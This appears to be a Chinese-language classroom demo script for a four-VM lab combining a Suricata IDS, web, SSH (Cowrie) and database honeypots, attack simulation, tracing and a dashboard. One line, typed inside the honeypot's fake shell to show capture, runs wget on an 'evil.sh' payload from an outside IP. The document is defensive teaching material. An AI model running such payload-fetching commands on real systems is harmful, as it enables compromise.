# 课题三 演示脚本

## 快照使用方式

4台VM恢复快照 → 全部开机 → 打开4个终端 → 进入演示流程

---

## 4台虚拟机中打开4个终端，可以提前跑好以下命令

| 窗口 | 命令（可提前跑好） |
|------|------------------|
| ①VM1 | 空白待命。攻击阶段看 `tail -f /var/log/suricata/fast-dmz.log` |
| ②VM2 | `tail -f /var/log/lab3/web_honeypot.log`（Web蜜罐的Flask访问日志）|
| ③VM3 | `tail -f /opt/cowrie/var/log/cowrie/cowrie.json`（Cowrie SSH蜜罐日志）|
| ④VM4 | `tail -f /var/log/lab3/db_honeypot.log`（DB蜜罐日志）|

**清空日志**（干净开始）：

```bash
# VM1
sudo bash -c "> /var/log/suricata/fast-dmz.log; > /var/log/suricata/fast-internal.log; > /var/log/lab3/events.jsonl"
```

---

## 检验虚拟机环境

**窗口①（VM1）上确认：**

```bash
# 四台在线
ping -c 1 -W 1 8.8.8.8 && echo "VM1 OK"
ping -c 1 -W 1 192.168.10.10 && echo "VM2 OK"
ping -c 1 -W 1 192.168.20.10 && echo "VM3 OK"
ping -c 1 -W 1 192.168.20.20 && echo "VM4 OK"

# Suricata 双实例
ps aux | grep '[s]uricata' | wc -l    # 必须 =2

# 关键服务
curl -s http://localhost:5000/health
curl -s http://192.168.10.10:8080/ | head -1
# VM1 远程测试 VM3 的 Cowrie 蜜罐是否在 22 端口响应
echo "=== 测试 SSH 蜜罐 ==="
ssh root@192.168.20.10 -p 22 -o StrictHostKeyChecking=no -o ConnectTimeout=3 exit 2>&1 | head -1
# 预期：看到 “Password:”提示或被拒绝，说明蜜罐在响应
```
---

### 网络拓扑与隔离验证

**在窗口①（VM1）上：**

```bash
# 三个网卡
ip -br addr show | grep -v lo

# iptables隔离规则
sudo iptables -L FORWARD -n -v --line-numbers | grep -E "DROP|ACCEPT"

# 外网无法直达内网
ping -c 1 -W 1 192.168.20.10 2>/dev/null && echo "通" || echo "不通 ✓"
ping 192.168.20.10 -n 1 # 宿主机是windows系统
```

"Gateway 三张网卡——NAT、DMZ、内网。iptables 保证外网只能访问 DMZ 的 Web 端口，无法直接抵达内网。"

---

### 攻击模拟与实时检测

**窗口①（VM1）直接执行攻击脚本。窗口②③④分别看各自蜜罐的实时日志滚动。**

在窗口 ① 执行：

```bash
sudo bash /opt/lab3/attack-sim/attack_simulator.sh
```

脚本输出到终端本身——会看到七个阶段依次执行。四个窗口：
| 攻击阶段 | 哪个窗口有动静 | 讲解 |
|---------|---------------|------|
| 阶段1-2：端口扫描、SQL注入、XSS、命令注入、Webshell | 窗口①脚本自身输出 | 脚本输出显示每个阶段执行详情。DMZ告警稍后统一查看 |
| 阶段3：Web蜜罐踩踏 | 窗口②（VM2）日志滚动 | Web蜜罐的Flask日志实时显示 `POST /admin/login`、`GET /etc/passwd` 等攻击请求——这就是攻击者在"踩"蜜罐 |
| 阶段4：内网横向移动 | 窗口① 脚本输出 | nmap 对内网进行端口扫描和SMB探测 |
| 阶段5：SSH暴力破解 | 窗口③（VM3）日志滚动 | Cowrie蜜罐实时接收15次暴力登录，JSON日志逐条记录每次尝试的用户名和密码 |
| 阶段6：DB蜜罐连接 | 窗口④（VM4）日志滚动 | 3306端口收到连接——DB蜜罐唤醒并记录来源IP |
| 阶段7：数据外传 | 窗口①脚本输出 | 大流量HTTP请求模拟数据外传 |

**攻击脚本跑完后，在窗口①查看Suricata双接口告警汇总：**

```bash
# 窗口①（VM1）：查看Suricata双接口告警数量
echo "=== Suricata DMZ 告警（Web 攻击）==="
tail -20 /var/log/suricata/fast-dmz.log
# 预期：看到CUSTOM-001/002/003/004/010/011等规则触发的行
```

---

### 蜜罐捕获详解

**分别在各自VM的窗口查看蜜罐捕获的证据：**

```bash
# 窗口②（VM2）— Web蜜罐登录记录
echo "=== Web 蜜罐登录尝试 ==="
sqlite3 /opt/lab3/web_honeypot/honeypot.db "SELECT ts, src_ip, username, password FROM login_attempts ORDER BY id DESC LIMIT 5"
```

"Web蜜罐记录了5次登录尝试——攻击者输入的用户名和密码被全量捕获。"

```bash
# 窗口①（VM1）— 现场演示高交互蜜罐
echo "=== 进入 SSH 蜜罐 ==="
ssh root@192.168.20.10 -p 22
# 进去后随便敲几个命令，如下
whoami                          # 显示 root —— 攻击者以为拿到了 root 权限
id                              # uid=0(root) —— 进一步"确认"高权限
uname -a                        # 看似真实的 Linux 内核版本
cat /etc/passwd                 # 假的用户列表,骗过攻击者的信息收集
wget http://1.1.1.1/evil.sh     # 关键:蜜罐把攻击者下载的"恶意文件"截获并保存
ps aux                          # 假的进程列表
exit                            # 退出,回到 VM1(务必退,别把后面命令敲在假 shell 里)

# 窗口③（VM3）
echo "=== Cowrie SSH 蜜罐暴力破解 ==="
sudo tail -10 /opt/cowrie/var/log/cowrie/cowrie.json

```

"Cowrie提供了完整的交互式shell——攻击者进去后可以执行ls、whoami、cat等命令，每一步都被记录。高仿真性让攻击者完全无法辨识这是蜜罐。"

```bash
# 窗口④（VM4）— DB蜜罐
echo "=== DB 蜜罐连接记录 ==="
cat /var/log/lab3/db_honeypot.log | tail -10
```

"三种蜜罐——SSH、Web、DB——从三个协议角度全覆盖攻击行为。"

---

### 溯源分析与仪表盘

**窗口①（VM1）：**

```bash
# 溯源引擎
python3 /opt/lab3/detections/trace/trace_engine.py
```

"溯源引擎按时间窗口+源IP聚类，重建攻击链，映射MITRE ATT&CK，生成攻击者画像。"

```bash
# 仪表盘 显示告警数量
curl -s http://localhost:5000/dashboard 2>/dev/null | grep -oP '(?<=<div class="num">)\d+' | tr '\n' ' '
echo "  ← CRITICAL / HIGH / MEDIUM"
```

"四路检测信号汇聚到统一仪表盘——Severity分级一目了然。"

---

### 检测拦截闭环与蜜罐恢复

**窗口①（VM1）：**

```bash
# 自动封禁
echo "=== 已被自动封禁的攻击 ==="
sudo iptables -L INPUT -n | grep DROP
```

**窗口③（VM3）：蜜罐重置**

```bash
# 因为Cowrie日志是cowrie用户所有，用sudo
sudo bash /opt/lab3/detections/honeypot/honeypot_reset.sh cowrie 2>&1 | tail -3
```

"traffic_analyzer对high/critical告警自动封禁IP；蜜罐cron每2小时自动重置，恢复到攻击前状态。检测到拦截、捕获到清除，形成安全运营闭环。"

---

## 故障应急速查

| 问题 | 在哪台 VM | 命令 |
|------|----------|------|
| VM2/3/4不通 | 相应VMware窗口 | `sudo systemctl stop NetworkManager; sudo netplan apply` |
| Suricata掉 | VM1 | `sudo pkill -9 suricata; sleep 2; sudo rm -f /var/run/suricata*.pid; sudo suricata -c /etc/suricata/dmz.yaml --af-packet -D; sleep 2; sudo suricata -c /etc/suricata/internal.yaml --af-packet -D` |
| Cowrie掉 | VM3 | `sudo /opt/cowrie/cowrie-env/bin/cowrie start` |
| Web蜜罐掉 | VM2 | `pkill -f web_honeypot; nohup python3 /opt/lab3/detections/honeypot/web_honeypot.py > /var/log/lab3/web_honeypot.log 2>&1 &` |
| DB蜜罐掉 | VM4 | `sudo pkill -f db_honeypot; sudo nohup python3 /opt/lab3/detections/honeypot/db_honeypot.py > /var/log/lab3/db_honeypot.log 2>&1 &` |
| log_aggregator掉 | VM1 | `nohup python3 /opt/lab3/aggregator/log_aggregator.py > /var/log/lab3/log_aggregator.log 2>&1 &` |

---

## 现场演示前检查清单

- 四台VM开机，ping通
- 四个终端窗口已开好
- 窗口② `tail -f` web_honeypot.log有内容滚动（说明蜜罐在跑）
- 窗口③ `tail -f` cowrie.json文件存在（说明Cowrie在跑）
- 窗口④ `tail -f` db_honeypot.log文件存在（说明DB蜜罐在跑）
- 窗口① `ps aux | grep '[s]uricata' | wc -l` =2
- 窗口① `curl -s http://localhost:5000/health` 返回OK
- 窗口① `ssh root@192.168.20.10 -p 22` 能进入Cowrie假shell